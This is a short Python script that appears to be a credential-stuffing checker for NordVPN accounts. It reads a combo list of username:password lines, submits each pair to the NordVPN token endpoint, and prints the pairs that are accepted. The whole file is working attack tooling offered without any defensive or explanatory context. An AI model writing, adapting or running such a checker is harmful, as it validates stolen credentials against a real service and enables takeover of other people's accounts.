import requests
import json
import sys

filename = sys.argv[1]
#Check validion of username and password
def checker(username, passowrd):
    url = "https://api.nordvpn.com/v1/users/tokens"
    data = {"username": username, "password": passowrd}

    r = requests.post(url, json=data)

    output = json.loads(r.content)

    if "expires_at" in output:
        return output["expires_at"]
    else:
        return False

def loadFile(fname):
    with open(fname) as f:
        content = f.readlines()
    content = [x.strip("\n").split(" ")[0] for x in content]
    return content

if __name__ == "__main__":

    fileContent = loadFile(filename)

    for userpass in fileContent:
        if ":" in userpass:
            d = userpass.split(":")
            outp = checker(d[0], d[1])

            if outp != False:
                print("Username: " + d[0] + "    Password: " + d[1])